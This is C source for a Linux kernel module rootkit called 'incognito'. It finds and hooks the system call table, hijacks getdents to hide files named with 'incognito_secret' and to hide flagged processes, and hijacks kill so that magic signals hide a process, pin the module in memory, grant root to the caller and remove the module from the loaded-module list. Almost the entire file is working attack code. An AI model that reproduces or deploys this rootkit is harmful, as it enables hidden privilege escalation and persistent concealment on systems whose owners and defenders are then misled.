/*
 * Copyright (C) 2018
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */


#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h> // task_struct definition
#include <asm/unistd.h>
#include <linux/list.h>
#include <linux/init_task.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/utsname.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

#include <asm/uaccess.h> //we are dealing with most recent kernel
#include <asm/unistd.h>

MODULE_LICENSE("GPL");

int incognito_init(void);
void incognito_exit(void);

#ifndef __KERNEL__
#define __KERNEL__
#endif

//for hiding pids and files/directories
//this is for pids
#define INCOGNITO 0x10000000
//any file or directory with the following prefix will be hidden while incognito is active
#define INCOGNITO_PREFIX "incognito_secret"

//kill command signals we use for our input
enum {
    //signal to toggle hide a process
    SIGHIDE = 31,
    //signal to toggle protect module
    SIGPROTECT = 1,
    //signal to grant root to a target process
    SIGROOT = 64,
    //signal to toggle the module to INCOGNITO MODE (hidden AND protected)
    SIGMODHIDE = 63,
};

//linux_dirent struct
//https://www.systutorials.com/docs/linux/man/2-getdents/
struct linux_dirent
{
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

// -----------------------SYSTEM CALL TABLE SECTION-----------------------------
unsigned long** sys_call_table;
#define HOOK(sys_call_table, originalFunction, hijackedFunction, __NR_index) \
	originalFunction = (void *)sys_call_table[__NR_index]; \
	sys_call_table[__NR_index] = (unsigned long*)&hijackedFunction

#define UNHOOK(sys_call_table, originalFunction, __NR_index)               \
	    sys_call_table[__NR_index] = (unsigned long*)originalFunction

//Need to list original system calls and the ones we are modifying
//we only need to hit a select few system calls to hide files, pids, and directories
//getdents is very important, hijacking it gets us hiding files and hiding processes
//-----------------------------Original call list------------------------------
asmlinkage long (*originalGetdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
//asmlinkage long (*originalRead)(unsigned int fd, char *buf, size_t count);
//asmlinkage long (*originalOpen)(const char __user *filename, int flags, umode_t mode);
//asmlinkage long (*originalLstat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
//asmlinkage long (*originalStat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
static asmlinkage long (*originalKill)(pid_t pid, int sig);

//------------------------------Hijacked call list------------------------------
asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
//asmlinkage long hijackedRead(unsigned int fd, char *buf, size_t count);
//asmlinkage long hijackedOpen(const char __user *filename, int flags, umode_t mode);
//asmlinkage long hijackedLstat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
//asmlinkage long hijackedStat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
static asmlinkage long hijackedKill(pid_t pid, int sig);

static int page_read_write(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);

        if(pte->pte &~ _PAGE_RW)
                pte->pte |= _PAGE_RW;
        return 0;
}

static int page_read_only(ulong address)
{
        uint level;
        pte_t *pte = lookup_address(address, &level);
        pte->pte = pte->pte &~ _PAGE_RW;
        return 0;
}

// -----------------------END SYSTEM CALL TABLE SECTION------------------------


// --------------------------------MODULE HIDE/UNHIDE ------------------------
//We can keep a list of other hidden modules if needed
struct list_head *mod_list;

//flag for hiding incognito
int hidden = 0;

void hide(void)
{
	if (hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);

	//update flag
	hidden = 1;
}

void reveal(void)
{
	if (!hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);

	//update flag
	hidden = 0;
}

//--------------------------END MODULE HIDE/REVEAL----------------------------

//-------------------------MODULE PROTECT/UNPROTECT-------------------------
//https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-module-use-counters.html
//We take advantage of the above to make incognito stick
//protection flag
int protected = 0;
void protect(void)
{
	if (protected){
		return;
	} else {
		try_module_get(THIS_MODULE);

		//update our protected flag
		protected = 1;
	}
}

void unprotect(void)
{
	if (!protected){
		return;
	} else {
		module_put(THIS_MODULE);

		//update our protected flag
		protected = 0;
	}
}

//----------------------------END PROTECT/UNPROTECT----------------------------

//---------------------------ROOT GET------------------------------------------
void root(void)
{
	//grants root to the process that calls this method
	struct cred *creds = prepare_creds();
	struct task_struct *task = current;

	//printk(KERN_INFO "changing %d - %s ; uid %d\n",task->pid,task->comm,task->real_cred->uid.val);
	creds->uid.val = 0;
	creds->euid.val = 0;
    creds->gid.val = 0;
	creds->egid.val = 0;

	//FYI THESE WILL CRASH LINUX
	//creds->suid.val = 0;
	//creds->sgid.val = 0;
	//creds->fsuid.val = 0;
	//creds->fsgid.val = 0;

	printk(KERN_WARNING "pid %d , %s is now root\n",task->pid,task->comm);

	commit_creds(creds);

}
//---------------------------END ROOT GET------------------------------------------


//---------------------------PROCESS HIDE------------------------------------------
//this method fetches the task struct of a given pid
struct task_struct * fetchTask(pid_t pid)
{
    struct task_struct *pointer = current;
    //for_each_process is a linux method in signal.h that goes throught the entire task list
    for_each_process(pointer) {
        //if the pid of the task matches our mark, return it
        if (pointer->pid == pid){
            return pointer;
        }
    }
    //otherwise, it's not there and we return null
    return NULL;
}

//check if a given pid is currently "incognto" (that is, hidden)
int isIncognito(pid_t pid)
{
    struct task_struct *task;

    if (!pid)
    {
        return 0;
    }

    task = fetchTask(pid);

    if (!task)
    {
    return 0;
    }

    if (task->flags & INCOGNITO)
    {
        //pid is currently hidden
        return 1;
    }

    return 0;
}

//---------------------------END PROCESS HIDE--------------------------------------
//---------------------------GETDENTS HIJACK-------------------------------------
//This is used for hiding files and pids and is thus VERY IMPORTANT
asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	long getdents;
    int proc = 0;
    long offset = 0;
    long error;

    //make linux_drent structs we need
    struct linux_dirent *directory;
    struct linux_dirent *ourDirp;
    struct linux_dirent *previous = NULL;

    //inode
    struct inode *d_inode;

	//Fetch the original getdents sys call
	getdents = (*originalGetdents)(fd, dirp, count);

    //check getdents
    if (getdents <= 0)
    {
        return getdents;
    }

    //http://www.emblogic.com/blog/08/gfp_kernel/
    ourDirp = kzalloc(getdents, GFP_KERNEL);
    if (ourDirp == NULL)
    {
            return getdents;
    }

    error = copy_from_user(ourDirp, dirp, getdents);
    if (error)
    {
        goto exit;
    }

    //define d_inode
    //4.x kernal so we use the following
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
    {
        proc = 1;
    }

    while (offset < getdents)
    {
        directory = (void *)ourDirp + offset;
        if ((!proc && (memcmp(INCOGNITO_PREFIX, directory->d_name, strlen(INCOGNITO_PREFIX)) == 0)) || (proc && isIncognito(simple_strtoul(directory->d_name, NULL, 10)))) {
            if (directory == ourDirp){
                getdents = getdents - directory->d_reclen;
                memmove(directory, (void *)directory + directory->d_reclen, getdents);
                continue;
            }
            previous->d_reclen += directory->d_reclen;
        } else {
            previous = directory;
        }
        offset += directory->d_reclen;
    }

    error = copy_to_user(dirp, ourDirp, getdents);

    if (error){
        goto exit;
    }

exit:
    kfree(ourDirp);
    return getdents;
}

void initializeHijack(void)
{
    HOOK(sys_call_table, originalGetdents, hijackedGetdents, __NR_getdents);

}

void exitHijack(void)
{
    UNHOOK(sys_call_table, originalGetdents, __NR_getdents);

}
//-----------------------------END GETDENTS------------------------------------
//-----------------------------KILL HIJACK------------------------------------
static asmlinkage long hijackedKill(pid_t pid, int signal)
{
    //hijack the kill command for our input
    //task for pid nonsense
    struct task_struct *task;
    switch (signal) {
        case SIGHIDE:
        //hide the process
        if ((task = fetchTask(pid)) == NULL){
            return -ESRCH;
        }
        task->flags ^= INCOGNITO;
            break;
        case SIGPROTECT:
        //toggle just the protection
        if (protected){
            unprotect();
        } else {
            protect();
        }
            break;
        case SIGROOT:
        //grant the process root
            root();
            break;
        case SIGMODHIDE:
        //hide and protect the module
            if (hidden){
                reveal();
                unprotect();
            } else {
                hide();
                protect();
            }
            break;
        default:
            return originalKill(pid, signal);
    }
    return 0;
}
//-----------------------------END KILL HIJACK------------------------------

int __init incognito_init(void)
{
  //find system call table address
	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
	if (!sys_call_table){
		printk(KERN_ERR "Incognito error: Can't find the system call table!!\n");
		return -ENOENT;
	} else {
		printk("Incognito: System call table located!\n");
		//print off the address of the system call table
		printk(KERN_INFO "Sys call table address : %p\n", sys_call_table);
	}

	//Start hidden and protected module
	//hide();
    //protect();
    

	//System Calls
	page_read_write((ulong)sys_call_table);
	//HOOK(sys_call_table, originalOpen, hijackedOpen, __NR_open);
	//HOOK(sys_call_table, originalLstat, hijackedLstat, __NR_lstat);
	//HOOK(sys_call_table, originalStat, hijackedStat, __NR_stat);

    //hook getdents
    HOOK(sys_call_table, originalKill, hijackedKill, __NR_kill);
    //get getdents
    initializeHijack();
	page_read_only((ulong)sys_call_table);
	//Debug Print
    printk("incognito: module loaded\n");

	//we immediately reveal since we have no way to enter commands yet!
	//if you remove this atm you won't be able to find incognito >:)
	//reveal();
    //unprotect();

  return 0;
}

void __exit incognito_exit(void)
{

	//unhook our hijacked calls
	page_read_write((ulong)sys_call_table);
	//UNHOOK(sys_call_table, originalOpen, __NR_open);
	//UNHOOK(sys_call_table, originalLstat, __NR_lstat);
	//UNHOOK(sys_call_table, originalStat, __NR_stat);

    //Unhook getdents last (this unhides processes)
    UNHOOK(sys_call_table, originalKill, __NR_kill);
    //pull out of getdents
    exitHijack();
	page_read_only((ulong)sys_call_table);


    printk("incognito: module removed\n");


}

module_init(incognito_init);
module_exit(incognito_exit);
